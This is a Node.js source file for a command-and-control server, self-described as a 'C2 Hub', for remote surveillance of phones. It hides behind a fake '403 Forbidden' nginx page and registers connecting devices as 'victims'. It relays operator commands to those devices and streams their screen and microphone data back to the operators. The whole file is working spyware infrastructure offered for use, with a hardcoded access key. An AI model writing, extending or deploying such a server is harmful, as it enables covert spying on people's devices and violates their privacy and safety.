const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');

const app = express();
const server = http.createServer(app);

// --- 1. MASKING & STEALTH ---
// Agar koi browser se URL khole, toh use ye fake page dikhega
app.get('/', (req, res) => {
    res.send(`
        <body style="background:#000;color:#333;font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0">
            <div style="text-align:center">
                <h1 style="font-size:1.5rem">403 Forbidden</h1>
                <p>Nginx/2.4.1 (Ubuntu) Server at Port 80</p>
            </div>
        </body>
    `);
});

// --- 2. SOCKET.IO ENGINE (The Heart) ---
const io = new Server(server, {
    cors: { origin: "*" },
    maxHttpBufferSize: 1e8, // 100MB for high-quality screen streaming
    pingTimeout: 60000,
});

let admins = new Set();
let victims = new Map();

io.on('connection', (socket) => {
    const role = socket.handshake.query.role; // 'admin' or 'target'
    const secretKey = socket.handshake.query.key;

    // Security check
    if (secretKey !== 'kavach_top_secret_2025') {
        return socket.disconnect();
    }

    if (role === 'admin') {
        admins.add(socket.id);
        console.log(`[+] Admin Connected: ${socket.id}`);
        // Send list of currently online victims to admin
        socket.emit('LIST_VICTIMS', Array.from(victims.values()));
    } 

    if (role === 'target') {
        const deviceData = {
            id: socket.id,
            model: socket.handshake.query.model || 'Unknown',
            ip: socket.handshake.address,
            status: 'Online'
        };
        victims.set(socket.id, deviceData);
        console.log(`[!] New Target: ${deviceData.model}`);
        
        // Notify all admins
        io.to(Array.from(admins)).emit('NEW_TARGET', deviceData);
    }

    // --- 3. COMMAND RELAY (Admin -> Server -> Target) ---
    socket.on('SEND_COMMAND', (data) => {
        // data = { targetId: "socket_id", cmd: "SCREEN_START", params: {} }
        if (admins.has(socket.id)) {
            io.to(data.targetId).emit('EXECUTE', {
                command: data.cmd,
                params: data.params
            });
        }
    });

    // --- 4. DATA STREAM RELAY (Target -> Server -> Admin) ---
    // Jab phone se screen/mic ka data aayega, use admins ko forward karna
    socket.on('STREAM_DATA', (packet) => {
        // packet = { type: 'screen', buffer: binaryData }
        io.to(Array.from(admins)).emit('LIVE_FEED', {
            from: socket.id,
            ...packet
        });
    });

    socket.on('disconnect', () => {
        if (admins.has(socket.id)) {
            admins.delete(socket.id);
        } else if (victims.has(socket.id)) {
            victims.delete(socket.id);
            io.to(Array.from(admins)).emit('TARGET_OFFLINE', socket.id);
        }
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`C2 Hub Running...`));